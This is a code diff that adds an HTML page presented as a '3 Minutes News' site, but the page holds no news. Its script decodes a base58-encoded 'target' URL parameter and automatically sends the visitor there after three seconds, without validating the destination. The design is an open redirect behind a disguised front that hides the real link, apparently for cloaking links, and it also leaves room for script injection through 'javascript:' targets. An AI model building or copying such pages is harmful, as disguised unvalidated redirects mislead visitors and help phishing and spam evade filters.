@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="3 Minutes News - Stay updated with the latest news in just 3 minutes.">
+  <meta name="keywords" content="news, latest news, 3 minutes news, quick news, daily news">
+  <title>3 Minutes News</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      width: 100%;
+      padding: 20px;
+      background-color: #fff;
+      flex: 1;
+      overflow-y: auto;
+    }
+    h1 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .news-item {
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #ddd;
+    }
+    .news-item:last-child {
+      border-bottom: none;
+    }
+    .news-item h2 {
+      margin: 0;
+      font-size: 18px;
+      color: #333;
+      text-align: left;
+      cursor: pointer;
+    }
+    .news-item .news-details {
+      display: none;
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #f9f9f9;
+      border-radius: 5px;
+    }
+    .news-item .news-details p {
+      margin: 0;
+      font-size: 14px;
+      color: #666;
+    }
+    .news-item .news-details img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 10px;
+      border-radius: 5px;
+    }
+    .news-item .news-details .read-more {
+      text-align: right;
+      margin-top: 10px;
+    }
+    .news-item .news-details .read-more a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      width: 100%;
+      padding: 10px 0;
+      background-color: #fff;
+    }
+    .footer a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .action-buttons {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .action-button {
+      width: 50px;
+      height: 50px;
+      background-color: #333;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      font-size: 24px;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+    .share-options {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      position: absolute;
+      bottom: 60px;
+      right: 0;
+    }
+    .share-options a {
+      margin: 5px 0;
+      color: #333;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 50px;
+      height: 50px;
+      background-color: #fff;
+      border-radius: 50%;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .share-options i {
+      font-size: 24px;
+    }
+    .share-options span {
+      display: none;
+    }
+    .share-options a:nth-child(1) i { color: #3b5998; } /* Facebook */
+    .share-options a:nth-child(2) i { color: #25D366; } /* WhatsApp */
+    .share-options a:nth-child(3) i { color: #0088cc; } /* Telegram */
+    .share-options a:nth-child(4) i { color: #333; } /* Copy Link */
+  </style>
+  <script>
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+    const BASE58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+
+    function base58Decode(base58Str) {
+      let num = BigInt(0);
+      for (let i = 0; i < base58Str.length; i++) {
+        const char = base58Str[i];
+        const charIndex = BASE58_CHARS.indexOf(char);
+        if (charIndex < 0) {
+          throw new Error('Invalid character in base58 string: ' + char);
+        }
+        num = num * BigInt(58) + BigInt(charIndex);
+      }
+      const bytes = [];
+      while (num > 0) {
+        bytes.push(Number(num % BigInt(256)));
+        num = num / BigInt(256);
+      }
+      return new TextDecoder().decode(new Uint8Array(bytes.reverse()));
+    }
+
+    let target = base58Decode(getQueryParam('target'));
+  </script>
+</head>
+<body>
+<div class="container">
+  <h1>
+    3 Minutes News
+  </h1>
+  <div class="row">
+    <div class="col-12 text-center mt-5">
+      <button type="button" class="btn btn-primary" onclick="goTarget()">Click to redirect</button>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="/about.html">About Us</a>
+  <a href="/contact.html">Contact Us</a>
+  <a href="/privacy.html">Privacy Policy</a>
+</div>
+<script>
+    function goTarget() {
+      window.location.href = target;
+    }
+    window.onload = function() {
+      setTimeout(goTarget, 3000);
+    };
+</script>
+<!-- Bootstrap JS and dependencies -->
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+</body>
+</html>
